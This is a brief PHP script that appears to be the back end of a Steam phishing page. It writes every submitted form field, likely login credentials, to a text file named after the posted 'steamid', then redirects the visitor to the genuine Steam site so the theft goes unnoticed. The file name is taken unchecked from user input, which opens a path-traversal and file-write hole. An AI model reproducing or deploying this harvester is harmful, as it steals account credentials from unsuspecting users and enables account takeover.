<?php
session_start();

	if(isset($_POST[ 'submit' ])) {
		array_pop($_POST);
		$f = fopen($_POST[ 'steamid' ].'.txt', 'w');
		foreach($_POST as $key => $value) {
			fwrite($f, $key.'='.$value);
			fwrite($f, PHP_EOL);
		}
		fwrite($f, PHP_EOL);
	}

header('Location: https://steamcommunity.com/');
session_unset();
session_destroy();
exit;
?>